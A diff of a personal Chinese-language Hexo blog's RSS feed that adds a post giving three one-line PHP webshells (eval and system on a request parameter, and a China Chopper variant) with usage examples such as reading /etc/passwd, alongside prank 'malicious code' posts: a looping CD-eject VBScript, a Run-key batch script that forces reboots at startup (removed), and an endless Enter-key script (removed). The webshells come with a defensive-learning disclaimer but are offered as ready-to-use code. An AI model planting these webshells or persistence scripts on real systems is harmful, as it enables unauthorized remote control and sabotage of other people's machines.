@@ -9,8 +9,43 @@
     <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>捕捉一只爱折腾的绯鞠</description>
-    <pubDate>Mon, 19 Oct 2020 11:37:30 GMT</pubDate>
+    <pubDate>Mon, 19 Oct 2020 15:00:33 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>【笔记】删除Mac多余音频驱动</title>
+      <link>https://feiju12138.github.io/2020/10/19/%E5%88%A0%E9%99%A4Mac%E5%A4%9A%E4%BD%99%E9%9F%B3%E9%A2%91%E9%A9%B1%E5%8A%A8/</link>
+      <guid>https://feiju12138.github.io/2020/10/19/%E5%88%A0%E9%99%A4Mac%E5%A4%9A%E4%BD%99%E9%9F%B3%E9%A2%91%E9%A9%B1%E5%8A%A8/</guid>
+      <pubDate>Mon, 19 Oct 2020 14:58:16 GMT</pubDate>
+      <description>
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;删除Mac多余音频驱动&lt;/p&gt;
+      
+      </description>
+      
+      
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>删除Mac多余音频驱动</p><a id="more"></a><h2 id="删除驱动"><a href="#删除驱动" class="headerlink" title="删除驱动"></a>删除驱动</h2><ul><li>在以下目录删除对应名称的音频驱动，并重启电脑</li></ul><blockquote><p><code>/Library/Extensions/</code><br><code>/System/Library/Extensions/</code><br><code>/Library/Audio/Plug-Ins/HAL/</code></p></blockquote><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="http://www.jouypub.com/2019/931064f5e92818407afdee54bcaa57cc/" target="_blank" rel="noopener">JouyPub的博客</a></p>]]></content:encoded>
+      
+      <comments>https://feiju12138.github.io/2020/10/19/%E5%88%A0%E9%99%A4Mac%E5%A4%9A%E4%BD%99%E9%9F%B3%E9%A2%91%E9%A9%B1%E5%8A%A8/#disqus_thread</comments>
+    </item>
+    
+    <item>
+      <title>【笔记】上传Webshell木马脚本</title>
+      <link>https://feiju12138.github.io/2020/10/19/%E4%B8%8A%E4%BC%A0Webshell%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC/</link>
+      <guid>https://feiju12138.github.io/2020/10/19/%E4%B8%8A%E4%BC%A0Webshell%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC/</guid>
+      <pubDate>Mon, 19 Oct 2020 14:31:19 GMT</pubDate>
+      <description>
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上传Webshell木马脚本进行渗透测试&lt;/p&gt;
+&lt;p&gt;&lt;font color=&quot;red&quot;&gt;本文仅用于网络信息防御学习&lt;/font&gt;&lt;/p&gt;
+      
+      </description>
+      
+      
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上传Webshell木马脚本进行渗透测试</p><p><font color="red">本文仅用于网络信息防御学习</font></p><a id="more"></a><h2 id="php权限马"><a href="#php权限马" class="headerlink" title="php权限马"></a>php权限马</h2><ul><li>创建<code>.php</code>文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ul><li>原理：可以将变量cmd赋值，但是只能赋值php代码</li><li>地址栏访问时追加参数<code>?cmd=phpinfo()</code></li></ul><h2 id="shell权限马"><a href="#shell权限马" class="headerlink" title="shell权限马"></a>shell权限马</h2><ul><li>创建<code>.php</code>文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><ul><li>原理：可以将变量cmd赋值，但是只能赋值shell代码</li><li>地址栏访问时追加参数<code>?cmd=cat /etc/passwd</code></li></ul><h2 id="中国菜刀马"><a href="#中国菜刀马" class="headerlink" title="中国菜刀马"></a>中国菜刀马</h2><blockquote><p><code>cmd</code>：作为使用中国菜刀时的密码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>配合中国菜刀进行渗透</li></ul><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1E4411L7zS" target="_blank" rel="noopener">哔哩哔哩——程序学习</a></p>]]></content:encoded>
+      
+      <comments>https://feiju12138.github.io/2020/10/19/%E4%B8%8A%E4%BC%A0Webshell%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC/#disqus_thread</comments>
+    </item>
     
     <item>
       <title>【笔记】java字符串转换为json对象</title>
@@ -61,40 +96,6 @@
       <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开启CD蜂鸣器恶意代码</p><a id="more"></a><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Set oWMP = CreateObject(<span class="string">"WMPlayer.OCX.7"</span>)</span><br><span class="line">Set colCDROMs = oWMP.cdromCollection</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> colCDROMs.Current &gt;= 1 <span class="keyword">then</span></span><br><span class="line">For i = 0 to colCDROMs.Count -1</span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line">For i = 0 to colCDROMs.Count -1</span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line">End If</span><br><span class="line">wscript.sleep 100</span><br><span class="line">loop</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>]]></content:encoded>
       
       <comments>https://feiju12138.github.io/2020/10/18/%E5%BC%80%E5%90%AFCD%E8%9C%82%E9%B8%A3%E5%99%A8/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>【恶意代码】启动电脑后自动关机</title>
-      <link>https://feiju12138.github.io/2020/10/18/%E5%90%AF%E5%8A%A8%E7%94%B5%E8%84%91%E5%90%8E%E8%87%AA%E5%8A%A8%E5%85%B3%E6%9C%BA/</link>
-      <guid>https://feiju12138.github.io/2020/10/18/%E5%90%AF%E5%8A%A8%E7%94%B5%E8%84%91%E5%90%8E%E8%87%AA%E5%8A%A8%E5%85%B3%E6%9C%BA/</guid>
-      <pubDate>Sun, 18 Oct 2020 03:25:17 GMT</pubDate>
-      <description>
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;启动电脑后自动关机恶意代码&lt;/p&gt;
-      
-      </description>
-      
-      
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>启动电脑后自动关机恶意代码</p><a id="more"></a><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> @<span class="built_in">echo</span> off&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">break</span> off&gt;&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> shutdown -r -t 11 -f&gt;&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> end&gt;&gt;c:windowshartlell.bat</span><br><span class="line">reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun</span><br><span class="line">/v startAPI /t reg_sz /d c:windowshartlell.bat /f</span><br><span class="line">reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun</span><br><span class="line">/v /t reg_sz /d c:windowshartlell.bat /f</span><br><span class="line">PAUSE</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>]]></content:encoded>
-      
-      <comments>https://feiju12138.github.io/2020/10/18/%E5%90%AF%E5%8A%A8%E7%94%B5%E8%84%91%E5%90%8E%E8%87%AA%E5%8A%A8%E5%85%B3%E6%9C%BA/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>【恶意代码】一直按回车</title>
-      <link>https://feiju12138.github.io/2020/10/18/%E4%B8%80%E7%9B%B4%E6%8C%89%E5%9B%9E%E8%BD%A6/</link>
-      <guid>https://feiju12138.github.io/2020/10/18/%E4%B8%80%E7%9B%B4%E6%8C%89%E5%9B%9E%E8%BD%A6/</guid>
-      <pubDate>Sun, 18 Oct 2020 03:22:33 GMT</pubDate>
-      <description>
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;一直按回车&lt;/p&gt;
-      
-      </description>
-      
-      
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直按回车</p><a id="more"></a><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Set wshShell = wscript.CreateObject(<span class="string">"WScript.Shell"</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">wscript.sleep 100</span><br><span class="line">wshshell.sendkeys <span class="string">"~(enter)"</span></span><br><span class="line">loop</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>]]></content:encoded>
-      
-      <comments>https://feiju12138.github.io/2020/10/18/%E4%B8%80%E7%9B%B4%E6%8C%89%E5%9B%9E%E8%BD%A6/#disqus_thread</comments>
     </item>
     
   </channel>
